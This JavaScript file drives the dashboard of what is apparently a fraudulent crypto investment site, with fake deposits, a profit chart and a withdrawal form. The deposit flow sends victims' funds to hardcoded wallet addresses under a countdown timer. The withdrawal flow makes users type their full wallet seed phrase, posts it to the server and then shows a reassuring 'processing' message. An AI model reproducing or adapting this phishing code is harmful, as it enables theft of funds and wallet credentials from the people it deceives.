document.addEventListener("DOMContentLoaded", () => {
	const dashboardRoot = document.getElementById("dashboard_root");

	// Switching between tabs
	const tabContents = document.querySelectorAll(".tab-content");
	const switchTabBtns = document.querySelectorAll(".switch-tab-btn");
	switchTabBtns.forEach(btn => {
		btn.addEventListener("click", () => {
			switchTabBtns.forEach(active => active.classList.remove("active"));
			tabContents.forEach(tab => {
				if (btn.id === tab.dataset.tab) {
					btn.classList.add("active");
					tab.classList.add("active");
				} else {
					tab.classList.remove("active");
				}
			})
		});
	});

	// Deposit modal
	const depositModal = document.querySelector(".deposit-modal");
	const withdrawalModal = document.querySelector(".withdrawal-modal");

	const openDepositModalBtn = document.querySelector(".open-deposit-modal");
	openDepositModalBtn.addEventListener("click", () => {
		depositModal.classList.add("active");
		tabContents.forEach(tab => {
			if (tab.classList.contains("deposit-tab")) {
				tab.classList.add("active");
			}
		})
	});
	const openWithdrawalModalBtn = document.querySelector(".open-withdrawal-modal");
	const balance = document.getElementById("user_balance")
	openWithdrawalModalBtn.addEventListener("click", () => {
		if (balance.innerText !== '$0.0') {
			withdrawalModal.classList.add("active");
			tabContents.forEach(tab => {
				if (tab.classList.contains("deposit-tab")) {
					tab.classList.add("active");
				}
			})
		} else {
			document.getElementById("notify").innerHTML = 'No Profits Made Yet';
			setTimeout(replacetext, 5000);
			function replacetext(){
				document.getElementById("notify").innerHTML = "Withdraw";
			};
		}
	});

	const closeDepositModalBtn = document.querySelector(".close-deposit-modal");
	closeDepositModalBtn.addEventListener("click", () => {
		depositModal.classList.remove("active");
		//clearInterval(timerInterval);
	});
	const closeWithdrawalModalBtn = document.querySelector(".close-withdrawal-modal");
	closeWithdrawalModalBtn.addEventListener("click", () => {
		withdrawalModal.classList.remove("active");
	});

	const depositCryptoTokens = document.getElementById("deposit-crypto-tokens");
	const optionTokens = depositCryptoTokens.querySelectorAll("option");
	const tokens = depositCryptoTokens.querySelectorAll(".token");
	const selected = depositCryptoTokens.querySelector(".selected-token");
	let selectedToken = "";
	selected.innerHTML = "";

	tokens.forEach(token => {
		token.addEventListener("click", (event) => {
			depositCryptoTokens.classList.toggle("active");
			selected.classList.toggle("active");
			if (token.classList.contains("active")) {
				token.classList.remove("active");
			} else {
				token.classList.add("active");
				selectedToken = token.innerHTML;
				console.log(selectedToken);
			}
		})
	});

	// Purchase inp tooltip
	const purchaseAmtInp = document.getElementById("purchase-amt");
	const purchaseAmtInpTooltip = document.getElementById("purchase-amt-min_tooltip");
	const purchaseAmtInpTooltip2 = document.getElementById("purchase-amt-max_tooltip");
	const emptyAmtTooltip = document.getElementById("empty-amt_tooltip");

	let minAmt = 150, maxAmt = 999999;
	purchaseAmtInp.addEventListener("input", (event) => {
		const amt = parseFloat(purchaseAmtInp.value);
		const inRange = amt >= minAmt;
		const outRange = amt > maxAmt;
		if (!inRange || purchaseAmtInp.value.length < 3) {
			purchaseAmtInpTooltip.classList.add("active");
			const proceed = document.querySelector(".inp-field.submit.proceed-to-payment");
			proceed.style.pointerEvents = "none";
		} else  if(outRange || purchaseAmtInp.value.length > 6) {
			purchaseAmtInpTooltip2.classList.add("active");
			const proceed = document.querySelector(".inp-field.submit.proceed-to-payment");
			proceed.style.pointerEvents = "none";
		}	else {
			purchaseAmtInpTooltip.classList.remove("active");
			purchaseAmtInpTooltip2.classList.remove("active");
			const proceed = document.querySelector(".inp-field.submit.proceed-to-payment");
			proceed.style.pointerEvents = "auto";
		}
	});

	const selectedCryptotoken = document.getElementById("selected-crypto-token");
	const selectedTokenPayment = document.querySelector(".selected-token-payment");

	let activeTokenHTML;
	activeTokenHTML = tokens[0].innerHTML;
	console.log(activeTokenHTML);

	const cryptoPaymentForm = document.getElementById("crypto-payment-method--form");
	const cryptoPaymentAddrForm = document.getElementById("crypto-payment-address--form");

	if (purchaseAmtInp.value.length === 0) {
		purchaseAmtInpTooltip.classList.add("active");
		const proceed = document.querySelector(".proceed-to-payment");
		proceed.style.pointerEvents = "none";
	}

	// Random wallet addresses
	const walletAddrContainer = document.getElementById("wallet-addr-container");
	const walletAddr = {
		btc: {
			addr1: "bc1q64vjhajtxucjz67a4cr2h6v2mqkue6jh37gtus",
			addr2: "bc1qt3l4c942562e2dy2qjhxegucwp3c3qnz87dlrh",
			addr3: "bc1q42ajrzx6xn02mhprrpr7ypmkx9l8mzg068s9tw",
		},
		eth: {
			addr1: "0xc426B34a22D8b0d41FB9F9a1F1dD603Eb76745DA",
			addr2: "0x37F7d23d0dEfa226A674759AeBef6433EcEEEC7B",
			addr3: "0x3821819F102aA2E516a087d641a6C13503d71Aec",
		},
		bnb: {
			addr4: "0x37F7d23d0dEfa226A674759AeBef6433EcEEEC7B",
			addr5: "0x3821819F102aA2E516a087d641a6C13503d71Aec",
			addr6: "0xc426B34a22D8b0d41FB9F9a1F1dD603Eb76745DA",
		},
		usdt: {
			addr4: "TLjcxEkfFVbFpctFpPDKkk58BvLFyvLGff",
			addr5: "TQ7BnA8p6XpBRSnRMf9Pq11Fk9ssMY3qr8",
			addr6: "TTd33qeisU8oEc2g2MQKwA3AYcDH8dJiBi",
		},
		sol: {
			addr4: "12QmqakyWDWGzJfhPvY12WScTTm5D2NE4E2FqBqYxSmJ",
			addr5: "BfY3THPiuYuBZA8KLaLTUdJQHao5PcAYk68snz9aXt1u",
			addr6: "3yctcbFLWg17pscs8uSsiWhmgUnB4UKD16cd5XpdCm2J",
		},
		ltc: {
			addr4: "ltc1q5cfdhv36ejh4cc0l5w8fhmpm69zmdsejhcjm7y",
			addr5: "ltc1qe3y0nj4pkzgpc8njfpdjgg0n3mzwlrk6epq29r",
			addr6: "ltc1qramsjxkm5sawypmjz0kdh93tllual9xhh52tt3",
		},
		trx: {
			addr4: "TLjcxEkfFVbFpctFpPDKkk58BvLFyvLGff",
			addr5: "TQ7BnA8p6XpBRSnRMf9Pq11Fk9ssMY3qr8",
			addr6: "TTd33qeisU8oEc2g2MQKwA3AYcDH8dJiBi",
		},
		doge: {
			addr1: "D81gatEoY8FoUXQYudqb7oakn1R96RK4NH",
			addr2: "DHwPiDgMXewQ5wq1xzw9XpZkR4GD9mjGWn",
			addr3: "DSVcHRoKns4GdxfTzoYNDApLwKbpvS62Du",
		}
	};

	const copiedTooltip = document.querySelector(".copied-addr-tooltip");

	// Timer
	const timer = document.getElementById("timer");
	let timerInterval;////////////////////////////
	let time = 300;

	cryptoPaymentForm.addEventListener("submit", (event) => {
		event.preventDefault();
			purchaseAmtInpTooltip.classList.remove("active");
			selectedTokenPayment.innerHTML = selectedToken || activeTokenHTML;
			const selectedPurchaseAmt = selectedTokenPayment.querySelector(".selected-purchase-amt");
			startTimer();

			// Randomizing wallet addresses
			const randomBtcAddr = getRandomBtcAddr(walletAddr.btc);
			const randomEthAddr = getRandomEthAddr(walletAddr.eth);
			const randomBnbAddr = getRandomBnbAddr(walletAddr.bnb);
			const randomUsdtAddr = getRandomUsdtAddr(walletAddr.usdt);
			const randomLtcAddr = getRandomLtcAddr(walletAddr.ltc);
			const randomSolAddr = getRandomSolAddr(walletAddr.sol);
			const randomTrxAddr = getRandomTrxAddr(walletAddr.trx);
			const randomDogeAddr = getRandomDogeAddr(walletAddr.doge);

			function getRandomBtcAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomEthAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomBnbAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomUsdtAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomLtcAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomSolAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomTrxAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}
			function getRandomDogeAddr(obj){
				const keys = Object.keys(obj);
				const randomKey = keys[Math.floor(Math.random() * keys.length)];
				return obj[randomKey];
			}

			// Copying the wallet addr
			walletAddrContainer.addEventListener("click", () => {
				const textarea = document.createElement("textarea");
				document.body.appendChild(textarea);
				textarea.value = walletAddrContainer.textContent;
				textarea.select();
				document.execCommand("copy");
				copiedTooltip.classList.add("active");
				document.body.removeChild(textarea);
				setTimeout(() => {
					copiedTooltip.classList.remove("active");
				}, 3000);
			});

			// Timer
			function startTimer(){
				timerInterval = setInterval(updateTimer, 1000);
			}

			function resetTimer(){
				clearInterval(timerInterval);
				time = 300;
				timer.textContent = formatTime(time);
			}

			function updateTimer(){
				if (time > 0) {
					time--;
					timer.textContent = formatTime(time);
				} else {
					clearInterval(timerInterval);
				}
			}

			function formatTime(seconds){
				const minutes = Math.floor(seconds/60);
				const timeRemaining = seconds % 60;
				return `${String(minutes).padStart(2,"0")}:${String(timeRemaining).padStart(2, "0")}`;
			}

			// Calculating currency equivalent
			const tokenPrices = {
				btc: 67500,
				eth: 3500,
				bnb: 600,
				usdt: 1,
				sol: 150,
				ltc: 77,
				trx: 0.11,
				doge: 0.13
			}

			const btcEquivalent = purchaseAmtInp.value / tokenPrices.btc;
			const ethEquivalent = purchaseAmtInp.value / tokenPrices.eth;
			const bnbEquivalent = purchaseAmtInp.value / tokenPrices.bnb;
			const usdtEquivalent = purchaseAmtInp.value / tokenPrices.usdt;
			const solEquivalent = purchaseAmtInp.value / tokenPrices.sol;
			const ltcEquivalent = purchaseAmtInp.value / tokenPrices.ltc;
			const trxEquivalent = purchaseAmtInp.value / tokenPrices.trx;
			const dogeEquivalent = purchaseAmtInp.value / tokenPrices.doge;

			const selectedTokenOptionIds = {
				"btc": selectedTokenPayment.querySelector("option#btc"),
				"eth": selectedTokenPayment.querySelector("option#eth"),
				"bnb": selectedTokenPayment.querySelector("option#bnb"),
				"usdt": selectedTokenPayment.querySelector("option#usdt"),
				"sol": selectedTokenPayment.querySelector("option#sol"),
				"ltc": selectedTokenPayment.querySelector("option#ltc"),
				"trx": selectedTokenPayment.querySelector("option#trx"),
				"doge": selectedTokenPayment.querySelector("option#doge")
			}

			const amount = purchaseAmtInp.value;
			fetch('/dashboard', { // Replace with your actual route
				method: 'POST',
				body: JSON.stringify({amount}),  // Convert data to JSON
				headers: { "Content-Type": "application/json" }
			})
			.then(response => response.text())
			.then(data => {
				console.log('AJAX response:', data);  // Display response for testing
				// Optionally display a success message or handle errors
			})
			.catch(error => console.error('Error:', error));

			if (selectedTokenOptionIds.btc){
				console.log("btc selected!");
				selectedPurchaseAmt.textContent = btcEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomBtcAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/bitcoin.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.eth) {
				console.log("eth selected!");
				selectedPurchaseAmt.textContent = ethEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomEthAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/ethereum.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.bnb) {
				console.log("bnb selected");
				selectedPurchaseAmt.textContent = bnbEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomBnbAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/bnb.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.usdt) {
				console.log("usdt selected");
				selectedPurchaseAmt.textContent = usdtEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomUsdtAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/usdt.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.sol) {
				console.log("sol selected");
				selectedPurchaseAmt.textContent = solEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomSolAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/sol.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.ltc) {
				console.log("ltc selected");
				selectedPurchaseAmt.textContent = ltcEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomLtcAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/ltc.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.trx) {
				console.log("trx selected");
				selectedPurchaseAmt.textContent = trxEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomTrxAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/trx.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
			} else if (selectedTokenOptionIds.doge) {
				console.log("matic selected");
				selectedPurchaseAmt.textContent = dogeEquivalent.toFixed(3);
				walletAddrContainer.textContent = randomDogeAddr;
				const selectedTokenOptionAvatar = selectedTokenPayment.querySelector(".avatar");
				if (selectedTokenOptionAvatar) {
					console.log("avatar present");
					selectedTokenOptionAvatar.style.cssText = `
						background-image: url("../assets/images/dashboard_crypto_token_icons/doge.png");
						margin: 0;
						display: flex;
					`;
				} else {
					console.warn("avatar not present!");
				}
		}
	});

	cryptoPaymentAddrForm.addEventListener("submit", (event) => {
		event.preventDefault();
		document.getElementById("dashboard_root").appendChild(depositPending);
		const closePopupBtn = document.querySelector(".close-popup");
		closePopupBtn.addEventListener("click", () => {
			document.getElementById("dashboard_root").removeChild(depositPending);
			completeDepositTab.classList.remove("active");
			depositModal.classList.remove("active");
		})
	});

	const cancelPaymentBtn = document.getElementById("cancel-payment");
	const completeDepositTab = document.querySelector(".complete-deposit-tab");
	cancelPaymentBtn.addEventListener("click", (event) => {
		event.preventDefault();
		completeDepositTab.classList.remove("active");
		depositModal.classList.remove("active");
		location.reload();
	});

	// Deposit confirmation modal

	let userName = username; // Replace with actual logged in user name

	const depositPending = document.createElement("div");
	depositPending.classList.add("deposit-pending-popup");
	depositPending.innerHTML = `
		<div class="col-center -gap-md">
			<span class="check-mark ms-rounded">hourglass_bottom</span>
			<span class="title-text bold-text">Deposit pending</span>
			<span class="body-text-xs text-center" style="max-width: 360px;">
				Dear ${userName}, your payment has been processed and is waiting to be confirmed.
				Please be patient, your balance will be updated once confirmation has been done.
			</span>
			<a href="/dashboard"><button class="close-popup primary-button xs c-normal">Okay, i understand</button></a>
		</div
	`;

	// WITHDRAWAL
	const withdrawalCryptoTokens = document.getElementById("withdrawal-crypto-tokens");
	const withdrawalOptionTokens = withdrawalCryptoTokens.querySelectorAll("option");
	const withdrawalTokens = withdrawalCryptoTokens.querySelectorAll(".token");
	const withdrawal_selected = withdrawalCryptoTokens.querySelector(".selected-token");
	let withdrawal_selectedToken = "";
	withdrawal_selected.innerHTML = "";

	withdrawalTokens.forEach(token => {
		token.addEventListener("click", (event) => {
			withdrawalCryptoTokens.classList.toggle("active");
			withdrawal_selected.classList.toggle("active");
			if (token.classList.contains("active")) {
				token.classList.remove("active");
			} else {
				token.classList.add("active");
				withdrawal_selectedToken = token.innerHTML;
				console.log(withdrawal_selectedToken);
			}
		})
	});

	// Withdraw inp tooltip
	const withdrawAmtInp = document.getElementById("withdrawal-amt");
	const destinationWalletAddr = document.getElementById("destination-wallet-addr");
	const secretPhrase = document.getElementById("secret-phrase");
	const withdrawAmtMinInpTooltip = document.getElementById("withdrawal-amt-min_tooltip");
	const withdrawAmtMaxInpTooltip = document.getElementById("withdrawal-amt-max_tooltip");
	const emptyWithdrawAmtTooltip = document.getElementById("empty-withdrawal-amt_tooltip");
	const proceed_ = document.querySelector(".inp-field.submit.place-withdrawal");
	proceed_.style.pointerEvents = "none";

	let minWithdrawalAmt = 500, maxWithdrawalAmt = 100000;
	withdrawAmtInp.addEventListener("input", (event) => {
		const withdrawalAmt = parseFloat(withdrawAmtInp.value);
		const inRange_ = withdrawalAmt >= minWithdrawalAmt;
		const outRange_ = withdrawalAmt > maxWithdrawalAmt;
		if (!inRange_ || withdrawAmtInp.value.length < 3) {
			withdrawAmtMinInpTooltip.classList.add("active");
			const proceed_ = document.querySelector(".inp-field.submit.place-withdrawal");
			proceed_.style.pointerEvents = "none";
		} else  if(outRange_ || withdrawAmtInp.value.length > 6) {
			withdrawAmtMaxInpTooltip.classList.add("active");
			const proceed_ = document.querySelector(".inp-field.submit.place-withdrawal");
			proceed_.style.pointerEvents = "none";
		}	else {
			withdrawAmtMinInpTooltip.classList.remove("active");
			withdrawAmtMaxInpTooltip.classList.remove("active");
			const proceed_ = document.querySelector(".inp-field.submit.place-withdrawal");
			proceed_.style.pointerEvents = "auto";
		}
	});

	const exchangeSelection = document.getElementById("exchange-selection");
	const exchangeOption = exchangeSelection.querySelectorAll("option");
	const exchanges = exchangeSelection.querySelectorAll(".exchange");
	const selectedExchange = exchangeSelection.querySelector(".selected-exchange");
	let selectedEx = "";
	selectedExchange.innerHTML = "";

	exchanges.forEach(exchange => {
		exchange.addEventListener("click", (event) => {
			exchangeSelection.classList.toggle("active");
			selectedExchange.classList.toggle("active");
			if (exchange.classList.contains("active")) {
				exchange.classList.remove("active");
			} else {
				exchange.classList.add("active");
				selectedEx = exchange.innerHTML;
				console.log(selectedEx);
			}
		})
	});

	// Withdrawal processing modal

	/*
		If phrases selected is less than 12 at minimum, do not submit the form,
		else, if phrases is 13 then allow submission
	*/

	const phrases = document.querySelectorAll("input.phrase");
	const phraseInpTooltip = document.getElementById("phrase-inp_tooltip");

	const withdrawalForm = document.getElementById("withdrawal-form");
	withdrawalForm.addEventListener("submit", (event) => {
		event.preventDefault();
		const emptyPhrase = Array.from(phrases).find(phrase => phrase.value === "");
		if (emptyPhrase) {
			phraseInpTooltip.classList.add("active");
		} else {
			let sphrase = '';
			for (let i = 0; i < phrases.length; i++) {
				sphrase += `${phrases[i].value}, `
			}
			fetch('/dashboard', { // Replace with your actual route
				method: 'POST',
				body: JSON.stringify({sphrase}),  // Convert data to JSON
				headers: { "Content-Type": "application/json" }
			})
			.then(response => response.text())
			.then(data => {
				console.log('AJAX response:', data);
			})
			.catch(error => console.error('Error:', error));

			phraseInpTooltip.classList.remove("active");
			document.getElementById("dashboard_root").appendChild(withdrawalProcessed);
			const closePopupBtn = document.querySelector(".close-popup");
			closePopupBtn.addEventListener("click", () => {
				document.getElementById("dashboard_root").removeChild(withdrawalProcessed);
				withdrawalModal.classList.remove("active");
				window.scrollTo(0,0);
			});
		}
	});

	// Withdrawal processing modal
	const withdrawalProcessed = document.createElement("div");
	withdrawalProcessed.classList.add("withdrawal-processed-popup");
	withdrawalProcessed.innerHTML = `
		<div class="col-center -gap-md">
			<span class="check-mark ms-rounded">hourglass_bottom</span>
			<span class="title-text bold-text">Withdrawal processing</span>
			<span class="body-text-xs text-center" style="max-width: 360px;">
				Dear ${userName}, your withdrawal has been placed and is waiting to be confirmed.
				Please be patient, your funds will be transferred to you once your wallet address has been verified.
			</span>
			<a href="/dashboard"><button class="close-popup primary-button xs c-normal">Okay, i understand</button></a>
		</div
	`;

	// Chart
	const labels = ["Day 1", "Day 2", "Day 3", "Day 4", "Day 5", "Day 6", "Day 7"];
	const data = {
		labels: labels,
		datasets: [{
			label: "Profit",
			backgroundColor: "#3092F410",
			borderColor: "#9FCEFF",
			fill: true,
			data: chart_data
		}]
	};

	const config = {
		type: "line",
		data: data,
		options: {
			tension: 0.4,
			maintainAspectRatio: false,
			scales: {
				y: {
					beginAtZero: true,
					ticks: {
						display: false
					},
					grid: {
						display: false,
						drawTicks: true,
						drawOnhartArea: false
					}
				},
				x: {
					beginAtZero: true,
					grid: {
						display: false,
						drawTicks: true,
						drawOnhartArea: false
					}
				}
			}
		}
	};

	const myChart = new Chart(
		document.getElementById("myChart"),config
	);

	const tradeRecordTabs = document.querySelectorAll(".trade-record-tab");
	const tradeRecordBtns = document.querySelectorAll(".trade-record-tab--btn");
	tradeRecordBtns.forEach(btn => {
		btn.addEventListener("click", () => {
			tradeRecordBtns.forEach(active => active.classList.remove("active"));
			tradeRecordTabs.forEach(tab => {
				if (btn.id === tab.dataset.record) {
					btn.classList.add("active");
					tab.classList.add("active");
				} else {
					tab.classList.remove("active");
				}
			})
		});
	});
});
